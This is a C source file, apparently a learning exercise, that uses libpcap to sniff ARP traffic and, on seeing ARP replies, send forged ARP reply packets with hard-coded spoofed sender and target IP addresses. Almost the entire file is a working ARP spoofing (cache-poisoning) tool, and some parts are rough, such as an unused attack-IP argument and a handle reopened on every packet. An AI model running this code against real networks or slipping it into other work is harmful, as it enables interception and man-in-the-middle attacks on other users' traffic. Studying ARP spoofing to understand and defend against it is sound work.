

#include <pcap.h>

#include <stdio.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <string.h>

#define ARP_REQUEST 1   /* ARP Request             */
#define ARP_REPLY 2     /* ARP Reply               */
#define MAX 1024

int retToken(char* ori[], char* ptr);
int retToken2(char* ori[], char* ptr);

    typedef struct arphdr {
        u_int16_t htype;    /* Hardware Type           */
        u_int16_t ptype;    /* Protocol Type           */
        u_char hlen;        /* Hardware Address Length */
        u_char plen;        /* Protocol Address Length */
        u_int16_t oper;     /* Operation Code          */
        u_char sha[6];      /* Sender hardware address */
        u_char spa[4];      /* Sender IP address       */
        u_char tha[6];      /* Target hardware address */
        u_char tpa[4];      /* Target IP address       */
    }arphdr_t;

    int main(int argc, char *argv[])
    {
        pcap_t *handle, *out;			/* Session handle */
        char *dev;			/* The device to sniff on */
        char errbuf[PCAP_ERRBUF_SIZE];	/* Error string */
        // char filter_exp[] = "port 80";	/* The filter expression */
        bpf_u_int32 mask;		/* Our netmask */
        bpf_u_int32 net;		/* Our IP */
        struct pcap_pkthdr * hdr;
        const u_char * packet;
        int i = 1;
        arphdr_t *arpheader = NULL;

        FILE *fp_ip, *fp_mac, *fp_gw_ip;
        int index, data;
        char *inp, *inp2;
        int buf_size = MAX;
        char* ptr;
        char attack_ip[16];
        char* ch_ip[MAX], *ch_mac[MAX], *ch_gw_ip[MAX]; // 문자열이 들어갈 배열
        u_char send_packet[100];

        strncpy (attack_ip, argv[1], sizeof (attack_ip));

        fp_ip = popen("ifconfig wlp1s0 | grep 'inet addr:' | cut -d: -f2 | awk '{print $1}'", "r");
        fp_mac = popen("ifconfig wlp1s0 | awk '/HWaddr/ {print $5}'", "r");
        fp_gw_ip = popen("route | grep default | awk '{print $2}'", "r");

        inp = malloc(buf_size);
        inp2 = malloc(buf_size);

        while(fgets(inp,buf_size,fp_ip)){
            index = retToken(ch_ip, inp);
        }

        for(data = 0 ; data < index ; data++){
            printf("%s \n", ch_ip[data]);
        }

        while(fgets(inp2,buf_size,fp_mac)){
            index = retToken2(ch_mac, inp2);
        }

        for(data = 0 ; data < index ; data++){
            printf("%s \n", ch_mac[data]);
        }

        while(fgets(inp,buf_size,fp_gw_ip)){
            index = retToken(ch_gw_ip, inp);
        }

        for(data = 0 ; data < index ; data++){
            printf("%s \n", ch_gw_ip[data]);
        }

        fclose(fp_ip);  //////////////////////////////////////////////

        //ip = (struct ip_header *)(packet + SIZE_ETHERNET);

        /* Define the device */
        dev = pcap_lookupdev(errbuf);    // device name look up
        if (dev == NULL) {               // error
            fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
            return(2);
        }
        printf("device : %s\n", dev);

        /* Find the properties for the device */
        if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
            fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
            net = 0;
            mask = 0;
        }

        /* Open the session in promiscuous mode */
        handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
        if (handle == NULL) {
            fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
            return(2);
        }

        /* Grab a packet */
        while(1){
            const int res = pcap_next_ex(handle, &hdr, &packet);
            if(res<0)
                break;
            if(res==0)
                continue;

        arpheader = (struct arphdr *)(packet+14); /* Point to the ARP header */
        printf("Hardware type: %s\n", (ntohs(arpheader->htype) == 1) ? "Ethernet" : "Unknown");
        printf("Protocol type: %s\n", (ntohs(arpheader->ptype) == 0x0800) ? "IPv4" : "Unknown");
        printf("Operation: %s\n", (ntohs(arpheader->oper) == ARP_REQUEST)? "ARP Request" : "ARP Reply");

        /* If is Ethernet and IPv4, print packet contents */
        if (ntohs(arpheader->htype) == 1 && ntohs(arpheader->ptype) == 0x0800){
        printf("Sender MAC: ");
        for(i=0; i<6;i++){
            if(i==5){
                printf("%02X", arpheader->sha[i]);
                break;
            }
            printf("%02X:", arpheader->sha[i]);
        }

        printf("\nSender IP: ");
        for(i=0; i<4;i++){
            if(i==3){
                printf("%d", arpheader->spa[i]);
                break;
            }
            printf("%d.", arpheader->spa[i]);
        }

        printf("\nTarget MAC: ");
        for(i=0; i<6;i++){
            if(i==5){
                printf("%02X", arpheader->tha[i]);
                break;
            }
            printf("%02X:", arpheader->tha[i]);
        }

        printf("\nTarget IP: ");
        for(i=0; i<4; i++){
            if(i==3){
                printf("%d", arpheader->tpa[i]);
                break;
            }
            printf("%d.", arpheader->tpa[i]);
        }
        printf("\n");
      }

        out = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
        if(ntohs(arpheader->oper) == ARP_REPLY){

        send_packet[0]=arpheader->sha[0];
        send_packet[1]=arpheader->sha[1];
        send_packet[2]=arpheader->sha[2];
        send_packet[3]=arpheader->sha[3];
        send_packet[4]=arpheader->sha[4];
        send_packet[5]=arpheader->sha[5];
        send_packet[6]=arpheader->tha[0];
        send_packet[7]=arpheader->tha[1];
        send_packet[8]=arpheader->tha[2];
        send_packet[9]=arpheader->tha[3];
        send_packet[10]=arpheader->tha[4];
        send_packet[11]=arpheader->tha[5];
        send_packet[12]=0x08;               // type : arp
        send_packet[13]=0x06;
        send_packet[14]=0x00;               // hardware type
        send_packet[15]=0x01;
        send_packet[16]=0x08;
        send_packet[17]=0x00;               // protocol type
        send_packet[18]=0x06;               // hardware size
        send_packet[19]=0x04;               // protocol size
        send_packet[20]=0x00;               // reply
        send_packet[21]=0x02;
        send_packet[22]=arpheader->tha[0];
        send_packet[23]=arpheader->tha[1];
        send_packet[24]=arpheader->tha[2];
        send_packet[25]=arpheader->tha[3];
        send_packet[26]=arpheader->tha[4];
        send_packet[27]=arpheader->tha[5];
        send_packet[28]=0xc0;               // sender ip
        send_packet[29]=0xa8;
        send_packet[30]=0Xda;
        send_packet[31]=0x25;
        send_packet[32]=arpheader->sha[0];
        send_packet[33]=arpheader->sha[1];
        send_packet[34]=arpheader->sha[2];
        send_packet[35]=arpheader->sha[3];
        send_packet[36]=arpheader->sha[4];
        send_packet[37]=arpheader->sha[5];
        send_packet[38]=0xc0;               // target ip
        send_packet[39]=0xa8;
        send_packet[40]=0X2B;
        send_packet[41]=0xAB;
        printf ("success??");

        pcap_sendpacket(out,send_packet,42);
        }
      }
        /* And close the session */
        pcap_close(handle);
        pcap_close(out);
        return(0);
    }

    int retToken(char* ori[] , char *inp){
            int i = 0;
            char* ptr = strtok(inp, ".");
            while(ptr != NULL){
                    ori[i] = ptr;
                    ptr = strtok(NULL, ".");
                    i++;
            }
            return i;
    }

    int retToken2(char* ori[], char *inp){
            int i=0;
            char* ptr = strtok(inp, ":");
            while(ptr != NULL){
                ori[i] = ptr;
                ptr = strtok(NULL, ":");
                i++;
            }
            return i;
    }

